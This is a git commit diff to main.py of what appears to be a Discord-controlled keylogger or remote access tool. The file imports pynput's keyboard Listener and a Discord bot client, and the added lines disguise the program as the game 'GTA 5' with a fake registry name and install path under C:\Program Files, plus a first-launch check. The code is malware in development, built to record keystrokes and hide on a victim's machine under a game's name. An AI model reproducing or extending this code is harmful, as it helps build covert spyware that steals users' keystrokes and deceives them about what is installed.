658265c025c9477fe1bf048546d92f4cb02dc08a
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-11-20 21:23:13 +0100

    Software is now checking if it's launched for the first time

--- main.py
+++ main.py
@@ -1,12 +1,19 @@
 import discord
 from pynput.keyboard import Key, Listener
+import sys
 
 client = discord.Client()
 bot_token = ''   # Paste here BOT-token
+software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
+software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
+software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
 channel_ids = {
     'main': 831567586344697868   # Paste here main channel ID
 }
+
+if sys.argv[0].lower() != 'c:\\program files\\' + software_directory_name.lower() + '\\' + software_executable_name.lower():
+    print('First launch!')
 
 @client.event 
 async def on_ready():  
